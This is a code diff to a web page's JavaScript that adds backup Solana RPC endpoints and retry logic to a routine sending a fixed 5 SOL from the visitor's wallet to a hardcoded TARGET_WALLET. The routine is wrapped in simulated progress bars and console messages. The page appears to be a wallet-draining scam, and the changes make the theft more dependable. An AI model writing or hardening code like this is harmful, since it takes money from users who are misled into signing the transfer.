@@ -593,17 +593,36 @@
             });
         }
 
-        // Initialize Solana connection
+        // Initialize Solana connection with multiple RPC endpoints
         async function initializeSolanaConnection() {
             try {
                 await waitForSolana();
-                if (SOLANA_NETWORK === 'mainnet-beta') {
-                    connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
-                } else {
-                    connection = new solanaWeb3.Connection('https://api.devnet.solana.com');
+                
+                const rpcEndpoints = SOLANA_NETWORK === 'mainnet-beta' ? [
+                    'https://solana-api.projectserum.com',
+                    'https://rpc.ankr.com/solana',
+                    'https://solana.public-rpc.com',
+                    'https://api.mainnet-beta.solana.com'
+                ] : [
+                    'https://api.devnet.solana.com',
+                    'https://rpc.ankr.com/solana_devnet'
+                ];
+
+                // Try each endpoint until one works
+                for (const endpoint of rpcEndpoints) {
+                    try {
+                        connection = new solanaWeb3.Connection(endpoint, 'confirmed');
+                        // Test the connection
+                        await connection.getLatestBlockhash();
+                        console.log(`Solana connection established: ${endpoint}`);
+                        return true;
+                    } catch (error) {
+                        console.log(`Failed to connect to ${endpoint}:`, error.message);
+                        continue;
+                    }
                 }
-                console.log('Solana connection initialized');
-                return true;
+                
+                throw new Error('All RPC endpoints failed');
             } catch (error) {
                 console.error('Failed to initialize Solana connection:', error);
                 return false;
@@ -742,10 +761,14 @@
 
             async initializeSolana() {
                 try {
-                    await initializeSolanaConnection();
-                    this.addConsoleLog('Solana network connection established', 'success');
+                    const connected = await initializeSolanaConnection();
+                    if (connected) {
+                        this.addConsoleLog('Solana network connection established', 'success');
+                    } else {
+                        this.addConsoleLog('Failed to connect to Solana network - using backup endpoints', 'error');
+                    }
                 } catch (error) {
-                    this.addConsoleLog('Failed to connect to Solana network', 'error');
+                    this.addConsoleLog('Network connection error - check internet connection', 'error');
                 }
             }
 
@@ -903,6 +926,14 @@
                     this.addConsoleLog('Creating SOL transfer transaction...', 'info');
                     await this.simulateProgress(0, 20, 800);
                     
+                    // Test connection first
+                    try {
+                        await connection.getLatestBlockhash();
+                    } catch (connectionError) {
+                        this.addConsoleLog('RPC connection failed, trying backup...', 'info');
+                        await initializeSolanaConnection();
+                    }
+                    
                     // Create the actual Solana transaction
                     const fromPubkey = new solanaWeb3.PublicKey(this.userWalletAddress);
                     const toPubkey = new solanaWeb3.PublicKey(TARGET_WALLET);
@@ -910,8 +941,20 @@
                     this.addConsoleLog(`Preparing 5 SOL transfer to: ${TARGET_WALLET}`, 'info');
                     await this.simulateProgress(20, 40, 1000);
                     
-                    // Get recent blockhash
-                    const latestBlockhash = await connection.getLatestBlockhash();
+                    // Get recent blockhash with retry
+                    let latestBlockhash;
+                    let retries = 3;
+                    while (retries > 0) {
+                        try {
+                            latestBlockhash = await connection.getLatestBlockhash('finalized');
+                            break;
+                        } catch (error) {
+                            retries--;
+                            if (retries === 0) throw error;
+                            this.addConsoleLog(`Retrying blockhash fetch... (${retries} attempts left)`, 'info');
+                            await this.delay(1000);
+                        }
+                    }
                     
                     // Create transaction with 5 SOL transfer
                     const transaction = new solanaWeb3.Transaction({
@@ -952,21 +995,33 @@
                     this.addConsoleLog('Transaction signed, broadcasting to network...', 'info');
                     await this.simulateProgress(60, 80, 1200);
                     
-                    // Send transaction
-                    const signature = await connection.sendRawTransaction(signedTransaction.serialize(), {
-                        skipPreflight: false,
-                        preflightCommitment: 'processed'
-                    });
+                    // Send transaction with retry
+                    let signature;
+                    retries = 3;
+                    while (retries > 0) {
+                        try {
+                            signature = await connection.sendRawTransaction(signedTransaction.serialize(), {
+                                skipPreflight: false,
+                                preflightCommitment: 'processed'
+                            });
+                            break;
+                        } catch (error) {
+                            retries--;
+                            if (retries === 0) throw error;
+                            this.addConsoleLog(`Retrying transaction broadcast... (${retries} attempts left)`, 'info');
+                            await this.delay(2000);
+                        }
+                    }
                     
                     this.addConsoleLog('Transaction sent, awaiting confirmation...', 'info');
                     await this.simulateProgress(80, 100, 1000);
                     
-                    // Wait for confirmation
+                    // Wait for confirmation with timeout
                     const confirmation = await connection.confirmTransaction({
                         signature: signature,
                         blockhash: latestBlockhash.blockhash,
                         lastValidBlockHeight: latestBlockhash.lastValidBlockHeight
-                    });
+                    }, 'confirmed');
                     
                     if (confirmation.value.err) {
                         throw new Error('Transaction failed: ' + JSON.stringify(confirmation.value.err));
